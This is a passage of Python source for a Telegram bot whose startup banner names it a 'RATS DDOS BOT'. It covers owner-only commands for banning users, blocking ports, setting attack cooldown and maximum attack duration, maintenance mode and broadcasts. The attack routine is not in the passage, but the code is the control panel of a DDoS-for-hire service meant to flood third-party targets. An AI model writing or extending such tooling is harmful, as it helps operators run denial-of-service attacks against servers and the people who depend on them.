    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /unbanuser USER_ID")
        return
    
    user_id = int(parts[1])
    
    if db.unban_user(user_id):
        safe_send_message(message.chat.id, f"✅ User {user_id} unbanned.")
        try:
            bot.send_message(user_id, "✅ You have been unbanned. You can now use the bot.")
        except:
            pass
    else:
        safe_send_message(message.chat.id, f"❌ User {user_id} not found.")

@bot.message_handler(commands=["blockport"])
def blockport_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /blockport PORT")
        return
    
    port = int(parts[1])
    if port < 1 or port > 65535:
        safe_send_message(message.chat.id, "❌ Port must be 1-65535.")
        return
    
    db.add_blocked_port(port)
    safe_send_message(message.chat.id, f"✅ Port {port} blocked.")

@bot.message_handler(commands=["unblockport"])
def unblockport_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        safe_send_message(message.chat.id, "❌ Usage: /unblockport PORT")
        return
    
    port = int(parts[1])
    db.remove_blocked_port(port)
    safe_send_message(message.chat.id, f"✅ Port {port} unblocked.")

@bot.message_handler(commands=["blockedports"])
def blockedports_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    ports = db.get_blocked_ports()
    response = f"🚫 BLOCKED PORTS\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    response += f"Ports: {', '.join(str(p) for p in sorted(ports))}\n\n"
    response += f"Total: {len(ports)} ports"
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["setcooldown"])
def setcooldown_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        current = db.get_setting("cooldown") or 60
        safe_send_message(message.chat.id, f"❌ Usage: /setcooldown SECONDS\nCurrent: {current}s")
        return
    
    seconds = int(parts[1])
    if seconds < 1:
        safe_send_message(message.chat.id, "❌ Cooldown must be at least 1 second.")
        return
    
    db.update_setting("cooldown", seconds)
    safe_send_message(message.chat.id, f"✅ Cooldown set to {seconds} seconds.")

@bot.message_handler(commands=["setmaxduration"])
def setmaxduration_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        current = db.get_setting("max_duration") or 300
        safe_send_message(message.chat.id, f"❌ Usage: /setmaxduration SECONDS\nCurrent: {current}s")
        return
    
    seconds = int(parts[1])
    if seconds < 1:
        safe_send_message(message.chat.id, "❌ Max duration must be at least 1 second.")
        return
    
    db.update_setting("max_duration", seconds)
    safe_send_message(message.chat.id, f"✅ Max duration set to {seconds} seconds.")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    global maintenance_mode, maintenance_message
    
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /maintenance MESSAGE")
        return
    
    maintenance_mode = True
    maintenance_message = parts[1]
    
    safe_send_message(
        message.chat.id,
        f"🔧 MAINTENANCE MODE ENABLED\n\nMessage: {maintenance_message}\n\nUse /ok to disable."
    )

@bot.message_handler(commands=["ok"])
def ok_command(message):
    global maintenance_mode, maintenance_message
    
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    maintenance_mode = False
    maintenance_message = ""
    
    safe_send_message(message.chat.id, "✅ Maintenance mode disabled.\nBot is back to normal operation.")

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ Usage: /broadcast MESSAGE")
        return
    
    msg = parts[1]
    users = db.get_all_users()
    
    success = 0
    fail = 0
    
    status_msg = safe_send_message(message.chat.id, "📢 Broadcasting...")
    
    for user in users:
        try:
            bot.send_message(
                user['user_id'],
                f"📢 ANNOUNCEMENT FROM OWNER\n\n{msg}\n\n🕐 {format_ist_time()} IST"
            )
            success += 1
            time.sleep(0.05)
        except:
            fail += 1
    
    try:
        bot.edit_message_text(
            f"✅ Broadcast Complete\n\n✅ Sent: {success}\n❌ Failed: {fail}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id
        )
    except:
        safe_send_message(message.chat.id, f"✅ Broadcast Complete!\n\n✅ Sent: {success}\n❌ Failed: {fail}")

@bot.message_handler(commands=["settings"])
def settings_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!")
        return
    
    cooldown = db.get_setting("cooldown") or 60
    max_duration = db.get_setting("max_duration") or 300
    blocked_ports = db.get_blocked_ports()
    admins = db.get_all_admins()
    
    response = (
        f"⚙️ BOT SETTINGS\n"
        f"{'='*40}\n\n"
        f"⏰ Cooldown: {cooldown}s\n"
        f"⏱️ Max Duration: {max_duration}s\n"
        f"🚫 Blocked Ports: {len(blocked_ports)}\n"
        f"🔧 Maintenance: {'ON' if maintenance_mode else 'OFF'}\n"
        f"👑 Owner: {OWNER_ID}\n"
        f"👥 Admins: {len(admins)}\n"
        f"🕐 IST Time: {format_ist_time()}"
    )
    
    safe_send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    if message.text and message.text.startswith('/'):
        safe_send_message(message.chat.id, "❌ Unknown command. Use /help")

# ============ START BOT ============

# Remove menu button completely
try:
    bot.set_my_commands([])
    print("✅ Menu button removed successfully!")
except Exception as e:
    print(f"❌ Failed to remove menu button: {e}")

print("=" * 60)
print("🤖 RATS DDOS BOT STARTING...")
print("=" * 60)
print(f"🤖 Bot Token: {BOT_TOKEN[:10] if BOT_TOKEN else 'Not set'}...")
print(f"👑 Owner ID: {OWNER_ID}")
print(f"🖥️ Server IP: {get_server_ip()}")
print(f"📦 Storage: JSON Files (data/ directory)")
print(f"🎯 Max Attack: {MAX_ATTACK_DURATION}s")
print(f"⏰ Cooldown: {COOLDOWN_AFTER_ATTACK}s")
print("=" * 60)

print("✅ Bot is running! Press Ctrl+C to stop.")
print("ℹ️ No menu button - users must use /help to see commands")
bot.infinity_polling()